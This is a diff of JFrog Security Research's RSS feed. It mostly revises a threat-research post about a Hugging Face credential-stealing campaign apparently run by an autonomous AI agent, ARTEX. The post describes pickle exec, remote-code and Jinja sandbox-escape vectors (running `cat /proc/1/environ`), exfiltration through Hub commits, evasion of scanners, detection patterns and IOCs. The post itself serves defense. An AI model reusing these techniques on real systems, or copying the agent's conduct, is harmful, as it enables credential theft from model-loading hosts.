@@ -4,7 +4,7 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Tue, 24 Nov 2026 13:45:10 GMT</lastBuildDate>
+        <lastBuildDate>Tue, 24 Nov 2026 15:13:37 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
@@ -16,9 +16,11 @@
             <pubDate>Tue, 24 Nov 2026 00:00:00 GMT</pubDate>
             <description><![CDATA[A Hugging Face malware campaign whose operator's own AI agent (ARTEX) leaked its environment while testing the payload. A later variant is built to get past model scanners.]]></description>
             <content:encoded><![CDATA[
+<img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/cover.jpg" alt="ARTEX, the AI agent that leaked its own credentials" style="max-width: 1000px; width: 100%; display: block; margin: 0 auto 24px;" />
+
 On the morning of November 24, a brand-new Hugging Face account published a model called `llama-3.2-1b-tuned`. The model card promised a fine-tuned 1B instruct model. The files told a different story: every `.bin` was about 2.5 KB, while a real 1B model weighs more than two gigabytes.
 
-What we found inside was a credential stealer with three different ways to run, which sends its loot out through Hugging Face itself. But the most interesting part was not the malware. It was the first set of stolen secrets, which turned out to belong to the attacker: an autonomous AI agent called **ARTEX** that built the model, tested it on itself, and published its own keys in the process. Over the next five hours the same agent kept adapting its packaging to slip past detection, while the payload underneath stayed the same. Following our report, Hugging Face has disabled every repo in the campaign.
+What we found inside was a credential stealer with three different ways to run, which sends its loot out through Hugging Face itself. But the most interesting part was not the malware. It was the first set of stolen secrets, which turned out to belong to the attacker: an autonomous AI agent called **ARTEX** that built the model, tested it on itself, and published its own keys in the process. Over the next five hours the same agent kept adapting its packaging to slip past detection, until its second model carried **no weights at all**: just a config, a borrowed tokenizer and two Python files that still ran the same payload on load, with no warning from Hugging Face. Following our report, Hugging Face has disabled every repo in the campaign.
 
 This post follows the investigation one question at a time.
 
@@ -39,7 +41,7 @@ Fine-tuned 1B instruct model (merge of sft + dpo).
 
 Without real weights, the files are clearly not there to run inference. They are there to run code. The first hint is in `config.json`, where `auto_map` sends `AutoConfig`, `AutoModel` and `AutoModelForCausalLM` to attacker-supplied Python files:
 
-![config.json auto_map](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/01_config_auto_map.png)
+<img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/01_config_auto_map.png" alt="config.json auto_map" style="max-width: 511px; width: 100%; display: block; margin: 0 auto 24px;" />
 
 Anyone who calls `from_pretrained(..., trust_remote_code=True)` on this repo imports `configuration_evil.py` before a single tensor is read. And that is only the first of three doors into the same room. The same payload also sits inside both `.bin` files as a malicious pickle, and the chat template tries a third way in through Jinja.
 
@@ -51,21 +53,21 @@ The moment the module is imported, it collects everything a cloud or ML workload
 
 > **Under the hood: the collector**
 >
-> ![loot() collector](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/02_loot_collector.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/02_loot_collector.png" alt="loot() collector" style="max-width: 783px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > `loot()` reads eight files and runs seven commands, including `nvidia-smi -L` to fingerprint GPU hosts. The result is one JSON object, about 16 KB on a typical container.
 
-The pickle door delivers the exact same code. `pytorch_model.bin` is a malicious pickle whose only job is `GLOBAL __builtin__ exec` followed by `REDUCE` over the payload source. The chat template takes a different approach: it tries four classic Jinja sandbox escapes to run `id`, `env` and `cat /proc/1/environ` and render the output straight into the prompt.
+The pickle door delivers the exact same code. `pytorch_model.bin` is a malicious pickle whose only job is `GLOBAL __builtin__ exec` followed by `REDUCE` over the payload source. The chat template takes a different approach, server-side template injection (SSTI): it tries four classic Jinja sandbox escapes to run `id`, `env` and `cat /proc/1/environ` and render the output straight into the prompt.
 
 > **Under the hood: the pickle and template doors**
 >
 > The final `pytorch_model.bin` uses PyTorch's pre-1.6 **legacy serialization**: several pickles back to back (the magic number `0x1950a86a20f9469cfc6c`, protocol version `1001`, a `sys_info` dict) and then the malicious one. A ZIP-format copy sits next to it as `pytorch_model_zip.bin`.
 >
-> ![legacy torch pickle disassembly](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/07_legacy_torch_pickle.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/07_legacy_torch_pickle.png" alt="legacy torch pickle disassembly" style="max-width: 937px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > Both formats are blocked by `torch.load(weights_only=True)`, the default since PyTorch 2.6. They still work against older stacks, code that passes `weights_only=False`, and anything that calls `pickle.load` directly. `pytorch_model_zip.bin` is not a name `transformers` loads by itself, which hints at a target that loads every `.bin` in a repo.
 >
-> ![chat template SSTI](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/06_chat_template_ssti.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/06_chat_template_ssti.png" alt="chat template SSTI" style="max-width: 799px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > `transformers` renders chat templates in `ImmutableSandboxedEnvironment`, which blocks these escapes. Inference servers that render templates with plain Jinja do not.
 
@@ -73,7 +75,7 @@ Collecting secrets is the easy part, though. Getting them out of a locked-down M
 
 ## Where does the stolen data go?
 
-Back to Hugging Face. The payload base64-encodes the collected JSON and commits it, as a new file called `loot-<hostname>-<pid>.json`, into the attacker's own model repo through the Hub's commit API. The write token it uses is hidden in the payload as a base64 literal.
+Back to Hugging Face. The payload base64-encodes the collected JSON and commits it, as a new file called `loot-<hostname>-<pid>.json`, into the attacker's own model repo through the commit API of the Hugging Face Hub. The write token it uses is hidden in the payload as a base64 literal.
 
 From the attacker's side, this is elegant. There is no command-and-control server to discover or block, because the only destination is `huggingface.co`, which ML workloads are allowed to reach almost by definition. Storage is free and versioned: every victim becomes a commit. And the channel survives the egress allowlists that were written precisely to let model downloads through.
 
@@ -81,7 +83,7 @@ It is also the operation's biggest weakness. The token can write to the repo, th
 
 > **Under the hood: the exfiltration**
 >
-> ![exfil() via HF commit API](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/03_exfil_hf_commit.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/03_exfil_hf_commit.png" alt="exfil() via HF commit API" style="max-width: 1151px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > The request is an NDJSON commit (`POST /api/models/<repo>/commit/main`, `Content-Type: application/x-ndjson`) with the summary `loot loot-<hostname>-<pid>.json`. The payload also keeps a local copy in `/tmp/.loot-<pid>-<hostname>.json` and drops an execution marker in `/tmp/.exec-<hostname>`.
 
@@ -91,7 +93,7 @@ That weakness is what let us read the first two loot files. And they raised a qu
 
 Fourteen seconds after the model files were uploaded, the payload fired for the first time. A file nobody had uploaded by hand appeared in the repo: `loot-28ed718137b2-229339.json`, 16 KB of environment variables, process listings and network configuration. Our first instinct was to look for the victim. But who loads a model fourteen seconds after it is published?
 
-The commit history tells the story minute by minute:
+The repo's commit history from those first minutes tells the story:
 
 | UTC (2026-11-24) | Commit | Event |
 |---|---|---|
@@ -103,10 +105,6 @@ The commit history tells the story minute by minute:
 | **03:07:58** | `b915be1` | **`loot-28ed718137b2-230002.json`** (16,334 B), second execution, same host |
 | 03:08:17 | `de31500` | *legacy torch format payload* |
 | 03:08:31 | `4dac940` | *add NOEXFIL self-test marker* |
-| 03:36–03:41 | — | `toktest1`–`toktest9` and `lootrepo` created |
-| 08:19:12 | — | account now `akashdutta1030`; `mistral-7b-utterance` and `loot` created |
-| 08:19:58 | `7678412` | *mistral*: v4 payload `RCE43861` |
-| 08:46:05 | `16ca113` | *coldload probe broken config*: `config.json` deliberately made invalid |
 
 Look at 03:07:23. Three seconds after the first loot arrived, the same file was overwritten with a one-line test: `{"test":"collector-path","who":"ihfprep2"}`. The payload had run from a folder called `/app/data/tasks/61/ihfprep2`. The "victim" was signing its own name.
 
@@ -126,13 +124,13 @@ The answer sits in the environment variables. Next to the usual `PATH` and `HOST
 | `ARTEX_PG_DSN` | `postgres://artex:<REDACTED>@postgres:5432/artex` | the agent keeps its state (tasks, memory, results) in Postgres |
 | `OPENAI_API_KEY` | `sk-<REDACTED>` | the key paying for those LLM calls |
 
-![leaked environment, redacted](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/09_loot_env_redacted.png)
+<img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/09_loot_env_redacted.png" alt="leaked environment, redacted" style="max-width: 745px; width: 100%; display: block; margin: 0 auto 24px;" />
 
 These variables live in the environment of process 1, so they belong to the container itself. Process 1 is `/app/start.sh`, which starts a binary called `./artex`, listening on `:8787` with a proxy on `:8788`. Everything else in the container runs underneath it. This is the runtime of an LLM-driven agent called **ARTEX**, and the malicious model was one of its work items: item `ihfprep2` of task 61.
 
 The rest of the loot fits that picture. The shell commands in the process list are single `bash -c "cd /app/data/tasks/NN/iXXXXX && cat > file <<'EOF' … EOF && …"` one-liners that write a file, run it and read the output, which is exactly how an agent's shell tool works. The fixes arrived at machine speed: two commits within seventy seconds of the first loot. And the commit messages read like a work log rather than a developer's history: *"legacy torch format payload"*, *"add NOEXFIL self-test marker"*, *"coldload probe broken config"*, and a ticket-style payload marker, `RCE43861`.
 
-We assess with **high confidence** that the malicious models were created, uploaded and tested from within an ARTEX agent task, with `gpt-5.4` as the agent's model. What the data cannot show is how much of the work the LLM chose on its own and how much a human operator asked for. ARTEX is the tool that produced these models; the person directing it remains unidentified. The container's DNS search domain points to `cldbase.us-west-1.rumble.cloud`, and its clock is set to `Asia/Shanghai`.
+We assess with **high confidence** that the malicious models were created, uploaded and tested from within an ARTEX agent task, with `gpt-5.4` as the agent's model. What the data cannot show is how much of the work the LLM chose on its own and how much a human operator asked for. ARTEX is the tool that produced these models; the person directing it remains unidentified.
 
 In short, the agent built the malware, ran it on itself to check that the chain worked, and published its own OpenAI key, database credentials and task list to a public repository. Which raises the obvious next question: what else was that agent working on?
 
@@ -140,7 +138,7 @@ In short, the agent built the malware, ran it on itself to check that the chain 
 
 The leaked process list is a snapshot of an autonomous agent running several operations at once. Each task is a working directory under `/app/data/tasks/<task>/<item>`, and model poisoning was only one of them.
 
-![leaked process list, abridged and redacted](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/10_loot_ps_redacted.png)
+<img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/10_loot_ps_redacted.png" alt="leaked process list, abridged and redacted" style="max-width: 753px; width: 100%; display: block; margin: 0 auto 24px;" />
 
 | Task | What the processes show |
 |---|---|
@@ -150,7 +148,7 @@ The leaked process list is a snapshot of an autonomous agent running several ope
 | shared | callback receivers on `:8899` and `:8898` (TLS), a local LLM relay behind another tunnel, several headless `Xvfb` displays |
 | egress | more than ten `relay.py` instances, each pinned to a residential-proxy session in a different country (US, CA, DE, GB, NL) |
 
-It runs as root in a Docker container, with no Kubernetes service account and no GPU. It is a general-purpose offensive automation box, and one of its tasks was to turn a Hugging Face model into an initial-access vector. We cannot rule out a red-team or bug-bounty engagement: SSRF anchors and "probe" naming would fit. But a credential-capturing phishing server, rotating residential proxies and a disposable Hugging Face identity are not what authorized engagements usually look like.
+It runs as root in a Docker container, with no Kubernetes service account and no GPU. Its DNS search domain points to `cldbase.us-west-1.rumble.cloud`, and its clock is set to `Asia/Shanghai`. It is a general-purpose offensive automation box, and one of its tasks was to turn a Hugging Face model into an initial-access vector. We cannot rule out a red-team or bug-bounty engagement: SSRF anchors and "probe" naming would fit. But a credential-capturing phishing server, rotating residential proxies and a disposable Hugging Face identity are not what authorized engagements usually look like.
 
 An agent that runs this many operations does not stop after one model. So what did it do next?
 
@@ -171,9 +169,9 @@ Broken JSON, wrong types, size limits, a flag present or absent: this reads like
 
 > **Under the hood: `evil_tok.py`**
 >
-> ![toktest tokenizer_config](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/08b_toktest_tokcfg.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/08b_toktest_tokcfg.png" alt="toktest tokenizer_config" style="max-width: 399px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
-> ![evil_tok.py](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/08_evil_tok.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/08_evil_tok.png" alt="evil_tok.py" style="max-width: 1095px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > A slimmer copy of the collector that tags its loot (`import_time`) and commits it to the separate `lootrepo`, so victim data no longer lands in the decoy model. `lootrepo` was still empty when the repos were disabled.
 
@@ -185,7 +183,7 @@ At 08:19 UTC the account, now renamed `akashdutta1030` (display name "Akash Dutt
 
 | File | Size | Role |
 |---|---|---|
-| `config.json` | 0.6 KB (`7678412`), 73 B at HEAD | a faithful Mistral-7B config plus `auto_map` → attacker modules |
+| `config.json` | 0.6 KB at first, 73 B after the last commit | a faithful Mistral-7B config plus `auto_map` → attacker modules |
 | `configuration_evil.py` | 3.3 KB | payload (marker `RCE43861`) + `EvilConfig` |
 | `modeling_evil.py` | 3.5 KB | the same payload (marker `RCE43861-modeling`) + `EvilModel` shim |
 | `tokenizer.json` | 1.8 MB | **byte-identical to `hf-internal-testing/llama-tokenizer`**, Hugging Face's own test fixture |
@@ -194,64 +192,37 @@ At 08:19 UTC the account, now renamed `akashdutta1030` (display name "Akash Dutt
 
 It doesn't need any. The payload fires while the config and the code are resolved, and that happens before weights are ever read. A metadata indexer, a model-card generator, a "cold-load" validation worker or an evaluation harness that only calls `AutoConfig.from_pretrained(..., trust_remote_code=True)` is enough. That service gets back a perfectly valid `MistralConfig` and sees nothing wrong. Each module even carries its own marker, so the operator can tell from the loot whether a victim only read the config or tried to load the full model.
 
-![v4 execution flow](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/16_v4_exec_flow.png)
+<img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/16_v4_exec_flow.png" alt="v4 execution flow" style="max-width: 873px; width: 100%; display: block; margin: 0 auto 24px;" />
 
 The collector has also been sharpened. Besides the usual secrets, it now looks for a particular environment: `/scratch/models`, `/workspace`, the Hugging Face cache, the Kubernetes CA certificate, and environment variables for NATS, Postgres and Redis. That is the profile of a model-serving fleet that pulls Hugging Face repos into a scratch volume and coordinates over NATS. The earlier probing seems to have told the agent what it was aiming at.
 
-> **Under the hood: the v4 payload**
+> **Under the hood: the second model's payload**
 >
-> ![v4 header](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/11_v4_header.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/11_v4_header.png" alt="v4 header" style="max-width: 775px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > Only standard-library imports, so it passes `transformers`' import pre-flight on any host. The embedded write token is the **same one** as in the first model, which ties the two account names together.
 >
-> ![v4 targeted collector](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/12_v4_collect.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/12_v4_collect.png" alt="v4 targeted collector" style="max-width: 1295px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > Commands now run through `subprocess.run(timeout=20)` instead of `os.popen`, so a hanging command can't stall the load and give the payload away. Output is capped, and nothing is written to `/tmp` anymore.
 >
-> ![v4 exfil](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/13_v4_exfil.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/13_v4_exfil.png" alt="v4 exfil" style="max-width: 1071px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > The loot goes to `loot/<host>-<md5>.json` in the separate `loot` repo, as a JSON commit with the summary `RCE43861 <hostname>` and an unusual `User-Agent: rce`.
 >
-> ![v4 modeling shim](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/15_v4_modeling_shim.png)
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/15_v4_modeling_shim.png" alt="v4 modeling shim" style="max-width: 519px; width: 100%; display: block; margin: 0 auto 24px;" />
 >
 > `EvilModel` is only a shim. Under `transformers`' auto-class flow it should fail with a `TypeError`, but only after both payload copies have already reported back.
 
 The last commit, *"coldload probe broken config"*, deliberately makes `config.json` invalid:
 
-![v4 broken config](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/14_v4_broken_config.png)
+<img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/14_v4_broken_config.png" alt="v4 broken config" style="max-width: 649px; width: 100%; display: block; margin: 0 auto 24px;" />
 
 With stock `transformers`, that actually disarms the latest revision: the JSON parse fails before `auto_map` is read. We read it as the agent testing how one target's cold-load path reacts to a broken config. Does it print a revealing stack trace? Does it fall back to importing the repo's Python some other way? Until the repo was disabled, anyone told to load revision `7678412` still got the armed version.
 
-Put next to the first model, this second one looks less like a new attack and more like the same attack in a new wrapper. How much did the agent change, and what did it keep?
+Side by side, the two models compare like this:
 
-## How did the agent adapt to detection, and what never changed?
-
-Over five hours, almost everything about the packaging changed. Hugging Face's scanner marks the first model's two pickle files as unsafe. Whether the agent saw those badges or simply anticipated them, the second model ships with no pickles at all. Its config advertises remote code, so the latest commit breaks the config, and with it the `custom_code` tag that lists the repo among remote-code models. Empty weights look suspicious, so the new repo borrows a real Mistral config and Hugging Face's own test tokenizer. The account that published the first model now has a different name.
-
-| What could give it away | How the agent adapted | What stayed the same |
-|---|---|---|
-| its own test runs leaking its environment | a `NOEXFIL` kill switch in v3, then removed in v4 | collection and exfiltration code |
-| scanners that only parse ZIP-format checkpoints | moved the pickle to the legacy torch format, kept a ZIP copy | `exec` of the same payload |
-| Hugging Face's "unsafe" badges on pickle files | v4 ships no weight files at all; the code lives only in `.py` | `auto_map` → payload at import time |
-| a 2.5 KB "1B model" looking fake | a real Mistral-7B config and a byte-identical HF test tokenizer | — |
-| the `custom_code` tag and `auto_map` in `config.json` | a deliberately broken `config.json` at HEAD | the modules are still served; revision `7678412` is still armed |
-| loot visible in the decoy model | separate `lootrepo`, then `loot` repos | the same Hub commit API as the exfiltration channel |
-| local traces and hanging commands | no `/tmp` files, 20-second command timeouts | a broader version of the same collector |
-| an account tied to the first model | renamed `hfusr5488184` → `akashdutta1030` | the same account ID and **the same write token** |
-
-![NOEXFIL guard added in v3](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/04_trigger_noexfil.png)
-
-Every change was about the wrapper. The core never moved: collect the host's secrets at import time and commit them to a Hub repo with the same token. That is what makes this campaign a useful lesson. An agent can iterate on packaging, metadata and identity far faster than detection rules change. Detection that keys on *what the file looks like* will keep losing to an attacker that can try a new look every few minutes. Detection that keys on *what the code does* (reading `/proc/1/environ`, writing to the Hub's commit API) keeps working.
-
-> **Under the hood: fossils of earlier versions**
->
-> ![v2 trigger](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/04b_trigger_v2.png)
->
-> ![EvilModel stub](/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/05_evilmodel_stub.png)
->
-> The v2 payload simply called `boom()` at import. In v3 that function is gone, but `EvilModel.__init__` still calls it inside a `try/except`, where it now fails silently.
-
-| | `llama-3.2-1b-tuned` (v1–v3) | `mistral-7b-utterance` (v4) |
+| | First model: `llama-3.2-1b-tuned` | Second model: `mistral-7b-utterance` |
 |---|---|---|
 | Uploaded | 03:05–03:08 UTC | 08:19–08:46 UTC |
 | Ways to run code | remote code, 2× pickle, SSTI template | remote code, SSTI template |
@@ -262,6 +233,39 @@ Every change was about the wrapper. The core never moved: collect the host's sec
 | Collector | generic container and K8s recon | targeted: NATS, Postgres, Redis, `/scratch/models`, HF cache |
 | Marker | commit summary `loot …` | `RCE43861[-modeling]`, `User-Agent: rce` |
 
+Put next to the first model, this second one looks less like a new attack and more like the same attack in a new wrapper. How much did the agent change, and what did it keep?
+
+## How did the agent adapt to detection, and what never changed?
+
+Over five hours, almost everything about the packaging changed. Hugging Face's scanner marks the first model's two pickle files as unsafe. Whether the agent saw those badges or simply anticipated them, the second model ships with no pickles at all. Its config advertises remote code, so the latest commit breaks the config, and with it the `custom_code` tag that lists the repo among remote-code models. Empty weights look suspicious, so the new repo borrows a real Mistral config and Hugging Face's own test tokenizer. The account that published the first model now has a different name.
+
+| What could give it away | How the agent adapted | What stayed the same |
+|---|---|---|
+| its own test runs leaking its environment | a `NOEXFIL` kill switch, later removed again | collection and exfiltration code |
+| scanners that only parse ZIP-format checkpoints | moved the pickle to the legacy torch format, kept a ZIP copy | `exec` of the same payload |
+| Hugging Face's "unsafe" badges on pickle files | the second model ships no weight files at all; the code lives only in `.py` | `auto_map` → payload at import time |
+| a 2.5 KB "1B model" looking fake | a real Mistral-7B config and a byte-identical HF test tokenizer | — |
+| the `custom_code` tag and `auto_map` in `config.json` | a deliberately broken `config.json` in the last commit | the modules were still served, and the earlier revision stayed armed |
+| loot visible in the decoy model | separate `lootrepo`, then `loot` repos | the same Hub commit API as the exfiltration channel |
+| local traces and hanging commands | no `/tmp` files, 20-second command timeouts | a broader version of the same collector |
+| an account tied to the first model | renamed `hfusr5488184` → `akashdutta1030` | the same account ID and **the same write token** |
+
+Every change was about the wrapper. The core never moved: collect the host's secrets at import time and commit them to a Hub repo with the same token. That is what makes this campaign a useful lesson. An agent can iterate on packaging, metadata and identity far faster than detection rules change. Detection that keys on *what the file looks like* will keep losing to an attacker that can try a new look every few minutes. Detection that keys on *what the code does* (reading `/proc/1/environ`, writing to the Hub's commit API) keeps working.
+
+> **Under the hood: traces of earlier versions**
+>
+> The `NOEXFIL` switch was added to the first model a minute after its own loot leaked:
+>
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/04_trigger_noexfil.png" alt="NOEXFIL guard added in v3" style="max-width: 551px; width: 100%; display: block; margin: 0 auto 24px;" />
+>
+> Before that, the payload simply called `boom()` at import:
+>
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/04b_trigger_v2.png" alt="v2 trigger" style="max-width: 799px; width: 100%; display: block; margin: 0 auto 24px;" />
+>
+> <img src="/img/RealTimePostImage/post/the-agent-that-robbed-itself-an-ai-driven-hugging-face-malware-campaign-leaks-its-own-operator/05_evilmodel_stub.png" alt="EvilModel stub" style="max-width: 479px; width: 100%; display: block; margin: 0 auto 24px;" />
+>
+> The final version dropped `boom()`, but `EvilModel.__init__` still calls it inside a `try/except`, where it now fails silently.
+
 ## How far did it spread?
 
 Not far, as far as we can tell. We searched our index of public Hugging Face repos and their file history for other `loot-<hex>-<n>.json` files and found none outside this repo. None of the payload files, in any version, appears by content hash outside this account. The account's other repos are the ones described above, all created between 03:05 and 08:19 UTC. Both loot drops were still empty when Hugging Face disabled them, which means no real victim had reported back.
@@ -270,11 +274,9 @@ This is a single, very new campaign, caught while it was still being developed. 
 
 ## How do you catch the next one?
 
-Look at behavior, not packaging. Both pickle carriers decompile to `GLOBAL __builtin__ exec` → `REDUCE`, which any opcode-level scanner catches, as long as it walks every concatenated pickle in the legacy torch format and not only the first. The Python modules are plain, unobfuscated code, and their strongest signals are writes to `huggingface.co/api/models/*/commit/main`, reads of `/proc/1/environ` and the service-account token, and a base64 literal starting with `aGZf` (`hf_`). In chat templates, `__globals__`, `__mro__`, `__subclasses__` and `.popen(` have no legitimate use.
+Look at behavior, not packaging. The second model proved that a malicious model doesn't need weights, so a scanner that only inspects weight files misses the part of the repo that actually runs: its Python. The signals that held across every version were in the code itself: writes to `huggingface.co/api/models/*/commit/main`, reads of `/proc/1/environ` and the service-account token, and a base64 literal starting with `aGZf` (`hf_`). A repo with `auto_map` modules and no weight files, or a `config.json` that fails to parse next to Python files, is a red flag on its own. In chat templates, `__globals__`, `__mro__`, `__subclasses__` and `.popen(` have no legitimate use. Our own pipeline flagged the first model's pickle files on ingestion; the second model is a reminder that pickle scanning alone is not enough.
 
-The second model adds a structural signal: a repo with `auto_map` modules and no weight files is a red flag on its own, and so is a `config.json` that fails to parse next to Python files. Our own model-scanning pipeline flagged both pickle files as malicious on ingestion, but the remote-code and template vectors in this campaign are a reminder that pickle scanning alone is not enough.
-
-On the consuming side, the basics still hold. Don't use `trust_remote_code=True` on repos you have not reviewed, and pin a `revision=` commit SHA: this repo changed its payload three times in under ninety seconds. Use `torch >= 2.6` with the default `weights_only=True`, prefer `safetensors`, and render chat templates only in a sandboxed Jinja environment. Egress rules that allow `huggingface.co` should allow downloads, not uploads: a model-loading workload that commits to the Hub should raise an alert. Platforms that load user-supplied repos should do it in a sandbox with no credentials in the environment, no service-account token and no outbound network.
+On the consuming side, don't use `trust_remote_code=True` on repos you have not reviewed, pin a `revision=` commit SHA, use `torch >= 2.6` with the default `weights_only=True`, and render chat templates only in a sandbox. A workload that loads models should be able to download from the Hub, not commit to it.
 
 YARA rules for both the exfiltration payload and the template injection are in [`hf_commit_exfil.yar`](/hf-agent-self-exfil-hf_commit_exfil.yar).
 
@@ -333,12 +335,12 @@ The full list is in [`iocs.csv`](/hf-agent-self-exfil-iocs.csv). Key items:
 |---|---|
 | HF account (ID `6b04f9e8746b081f2c411875`) | `hfusr5488184`, renamed to `akashdutta1030`; org `probeorg9x7y2` |
 | Repos | `llama-3.2-1b-tuned`, `lootrepo`, `toktest1`…`toktest9`, `mistral-7b-utterance`, `loot` |
-| v4 configuration_evil.py sha256 | `ceb5816fac7cbd886b096c7f0c0402913488ca0f967b617d3a7e25508032e6a8` |
-| v4 modeling_evil.py sha256 | `b068b5a2ec3a6a13deef686173935330fb2f7fd2b3fb1f34aa2b6e359624de19` |
-| configuration_evil.py (v3) sha256 | `ed89685e8c16d0cb6dc218d0972e7a0a9e292f9b98f6b0ef0b2ab340d06d34e3` |
-| modeling_evil.py (v3) sha256 | `79b47fe688932507fa013de36c057846916f586b3893f2fae3fc364cbd5d7c9e` |
-| pytorch_model.bin (v3) sha256 | `2bf25c4c3aa1e2efdff4ae9ee7e1434e279115608eb7a176e4e50e874c07c50d` |
-| pytorch_model_zip.bin (v3) sha256 | `783f54898ba4b828e14a2e5ab3c50968bca0883b0fc0309c24876c9c7f99e841` |
+| configuration_evil.py (second model) sha256 | `ceb5816fac7cbd886b096c7f0c0402913488ca0f967b617d3a7e25508032e6a8` |
+| modeling_evil.py (second model) sha256 | `b068b5a2ec3a6a13deef686173935330fb2f7fd2b3fb1f34aa2b6e359624de19` |
+| configuration_evil.py (first model) sha256 | `ed89685e8c16d0cb6dc218d0972e7a0a9e292f9b98f6b0ef0b2ab340d06d34e3` |
+| modeling_evil.py (first model) sha256 | `79b47fe688932507fa013de36c057846916f586b3893f2fae3fc364cbd5d7c9e` |
+| pytorch_model.bin (first model) sha256 | `2bf25c4c3aa1e2efdff4ae9ee7e1434e279115608eb7a176e4e50e874c07c50d` |
+| pytorch_model_zip.bin (first model) sha256 | `783f54898ba4b828e14a2e5ab3c50968bca0883b0fc0309c24876c9c7f99e841` |
 | evil_tok.py sha256 | `b43e7d812ab6541bfce4f85b2a19ba051f1b560b581aa203754e088fe2367961` |
 | Exfil endpoints | `POST https://huggingface.co/api/models/{hfusr5488184,akashdutta1030}/{llama-3.2-1b-tuned,lootrepo,loot}/commit/main` |
 | Payload markers | `RCE43861`, `RCE43861-modeling`, `User-Agent: rce` |
@@ -1538,141 +1540,6 @@ https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
